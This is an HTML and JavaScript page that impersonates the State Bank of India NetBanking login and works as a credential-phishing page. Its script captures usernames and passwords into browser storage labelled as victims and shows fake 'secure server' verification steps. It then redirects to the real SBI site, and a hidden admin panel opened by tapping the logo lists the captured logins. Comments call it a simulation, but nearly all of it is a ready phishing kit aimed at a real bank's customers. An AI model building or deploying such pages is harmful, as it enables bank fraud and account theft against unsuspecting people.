<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>State Bank of India - NetBanking</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #edf2f9; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
        .top-bar { background: #2b3a67; color: white; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; }
        .top-bar img { height: 32px; }
        .container { padding: 20px 16px; max-width: 450px; margin: 0 auto; }
        .card { background: white; border-radius: 16px; box-shadow: 0 6px 18px rgba(0,0,0,0.05); padding: 24px 20px; border: 1px solid #e0e7ef; }
        .sbi-logo { display: flex; justify-content: center; margin-bottom: 20px; }
        .sbi-logo img { height: 45px; }
        h3 { color: #1a2b4c; margin-bottom: 6px; font-weight: 600; font-size: 20px; }
        .sub { color: #546e7a; margin-bottom: 24px; font-size: 14px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; font-size: 14px; font-weight: 500; color: #2c3e50; margin-bottom: 6px; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1.5px solid #d4deec; border-radius: 10px; font-size: 16px; background: white; }
        .input-group input:focus { border-color: #2b3a67; outline: none; }
        .captcha-box { background: #f4f7fc; padding: 12px; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; }
        .captcha-box span { background: white; padding: 8px 16px; border-radius: 6px; font-family: monospace; font-size: 20px; letter-spacing: 3px; border: 1px dashed #2b3a67; margin-right: 12px; }
        .captcha-box input { flex: 1; padding: 12px; border: 1.5px solid #d4deec; border-radius: 8px; }
        .login-btn { background: #2b3a67; color: white; border: none; width: 100%; padding: 16px; border-radius: 40px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        .login-btn:active { background: #1a253f; }
        .footer-links { margin-top: 24px; text-align: center; font-size: 13px; color: #5e7a93; }
        .footer-links a { color: #2b3a67; text-decoration: none; margin: 0 8px; font-weight: 500; }

        /* Processing Overlay */
        #processingOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.98); z-index: 1000;
            display: none; justify-content: center; align-items: center;
            flex-direction: column; padding: 20px;
        }
        .spinner { width: 50px; height: 50px; border: 5px solid #e0e7ef; border-top-color: #2b3a67; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .progress-container { width: 250px; background: #e0e7ef; border-radius: 20px; height: 8px; margin: 20px 0; }
        .progress-bar { width: 0%; height: 8px; background: #2b3a67; border-radius: 20px; transition: width 0.5s; }
        #statusMsg { font-size: 16px; color: #1e2b3c; margin: 10px 0; font-weight: 500; }

        /* Secret Admin Panel */
        #adminPanel {
            margin-top: 20px; background: #0b1423; border-radius: 16px; padding: 16px;
            color: #e0e7ef; display: none; border: 1px solid #334155;
        }
        #adminPanel.show { display: block; }
        .admin-title { color: #f87171; font-weight: bold; margin-bottom: 12px; font-size: 14px; }
        .cred-row { background: #1a253f; padding: 10px; border-radius: 8px; margin-bottom: 6px; word-break: break-all; }
        .close-admin { background: #334155; color: white; border: none; padding: 8px 16px; border-radius: 30px; margin-top: 12px; }
    </style>
</head>
<body>

<div class="top-bar">
    <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/SBI-logo.svg" alt="SBI Logo">
    <span style="font-size:14px;">NetBanking</span>
</div>

<div class="container">
    <div class="card" id="loginCard">
        <div class="sbi-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/SBI-logo.svg" alt="SBI">
        </div>
        <h3>Login to NetBanking</h3>
        <p class="sub">Access your accounts securely</p>
        
        <form id="loginForm">
            <div class="input-group">
                <label>Username / Customer ID</label>
                <input type="text" id="username" placeholder="Enter username" autocomplete="off" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Enter password" autocomplete="off" required>
            </div>
            <div class="captcha-box">
                <span id="captchaText">A3B8X</span>
                <input type="text" id="captchaInput" placeholder="Enter captcha" required>
            </div>
            <button type="submit" class="login-btn">Secure Login</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot Username?</a> | <a href="#">Forgot Password?</a> | <a href="#">New User? Register</a>
        </div>
        
        <!-- Secret admin panel -->
        <div id="adminPanel">
            <div class="admin-title">📋 Captured Credentials (Admin)</div>
            <div id="victimData"></div>
            <button class="close-admin" id="closeAdmin">Close</button>
        </div>
    </div>
</div>

<!-- Processing Overlay (Multi-step flow) -->
<div id="processingOverlay">
    <div class="spinner"></div>
    <div id="statusMsg">Verifying credentials...</div>
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <p style="margin-top:20px; color:#5e7a93; font-size:13px;">Please do not refresh or press back</p>
</div>

<script>
    // ========== CAPTCHA GENERATION ==========
    function randomCaptcha() {
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        let captcha = '';
        for(let i=0; i<5; i++) captcha += chars[Math.floor(Math.random() * chars.length)];
        return captcha;
    }
    const captchaSpan = document.getElementById('captchaText');
    let currentCaptcha = randomCaptcha();
    captchaSpan.textContent = currentCaptcha;

    // ========== PHISHING LOGIC WITH MULTI-STEP FLOW ==========
    const form = document.getElementById('loginForm');
    const overlay = document.getElementById('processingOverlay');
    const statusMsg = document.getElementById('statusMsg');
    const progressBar = document.getElementById('progressBar');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const captchaInput = document.getElementById('captchaInput').value;
        
        // Simple captcha validation (simulated)
        if (captchaInput.toUpperCase() !== currentCaptcha) {
            alert('Invalid captcha. Please try again.');
            currentCaptcha = randomCaptcha();
            captchaSpan.textContent = currentCaptcha;
            document.getElementById('captchaInput').value = '';
            return;
        }
        
        // Save credentials to localStorage (simulate attacker database)
        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
        let victims = JSON.parse(localStorage.getItem('sbiVictims')) || [];
        victims.push({
            username: username,
            password: password,
            time: timestamp,
            ip: 'Simulated'
        });
        localStorage.setItem('sbiVictims', JSON.stringify(victims));
        
        // Show processing overlay
        overlay.style.display = 'flex';
        document.getElementById('loginCard').style.opacity = '0.4';
        
        // Multi-step flow
        const steps = [
            { msg: 'Verifying credentials...', progress: 15, delay: 800 },
            { msg: 'Authenticating with SBI secure server...', progress: 30, delay: 1000 },
            { msg: 'Establishing encrypted channel...', progress: 50, delay: 800 },
            { msg: 'Downloading security certificate...', progress: 70, delay: 1200 },
            { msg: 'Validating session token...', progress: 85, delay: 900 },
            { msg: 'Preparing dashboard...', progress: 95, delay: 700 },
            { msg: 'Almost there...', progress: 100, delay: 600 }
        ];
        
        let stepIndex = 0;
        function runStep() {
            if (stepIndex < steps.length) {
                const step = steps[stepIndex];
                statusMsg.textContent = step.msg;
                progressBar.style.width = step.progress + '%';
                stepIndex++;
                setTimeout(runStep, step.delay);
            } else {
                // After all steps, redirect to real SBI netbanking page (legitimate)
                setTimeout(() => {
                    overlay.style.display = 'none';
                    window.location.href = 'https://retail.onlinesbi.sbi/personal/';
                }, 800);
            }
        }
        runStep();
    });

    // ========== SECRET ADMIN PANEL (for attacker demonstration) ==========
    const adminPanel = document.getElementById('adminPanel');
    const victimDataDiv = document.getElementById('victimData');
    
    function refreshAdminPanel() {
        const data = localStorage.getItem('sbiVictims');
        if (data) {
            const victims = JSON.parse(data);
            let html = '';
            victims.slice().reverse().forEach(v => {
                html += `<div class="cred-row">
                    <div><strong>👤 ${v.username}</strong></div>
                    <div>🔑 ${v.password}</div>
                    <div style="font-size:11px; opacity:0.7;">${v.time}</div>
                </div>`;
            });
            victimDataDiv.innerHTML = html || '<p>No credentials yet.</p>';
        } else {
            victimDataDiv.innerHTML = '<p>No credentials captured.</p>';
        }
    }
    
    // Show panel via triple tap on SBI logo (top bar)
    let tapCount = 0;
    let tapTimer = null;
    document.querySelector('.top-bar img').addEventListener('click', function() {
        tapCount++;
        if (tapCount === 1) {
            tapTimer = setTimeout(() => { tapCount = 0; }, 800);
        }
        if (tapCount >= 3) {
            clearTimeout(tapTimer);
            tapCount = 0;
            refreshAdminPanel();
            adminPanel.classList.add('show');
        }
    });
    
    // Alternative: long press on "Secure Login" button
    const loginBtn = document.querySelector('.login-btn');
    let pressTimer;
    loginBtn.addEventListener('touchstart', function(e) {
        pressTimer = setTimeout(() => {
            refreshAdminPanel();
            adminPanel.classList.add('show');
        }, 1000);
    });
    loginBtn.addEventListener('touchend', function() { clearTimeout(pressTimer); });
    loginBtn.addEventListener('touchmove', function() { clearTimeout(pressTimer); });
    
    document.getElementById('closeAdmin').addEventListener('click', function() {
        adminPanel.classList.remove('show');
    });
    
    // Reset captcha if clicked
    captchaSpan.addEventListener('click', function() {
        currentCaptcha = randomCaptcha();
        captchaSpan.textContent = currentCaptcha;
    });
</script>
</body>
</html>
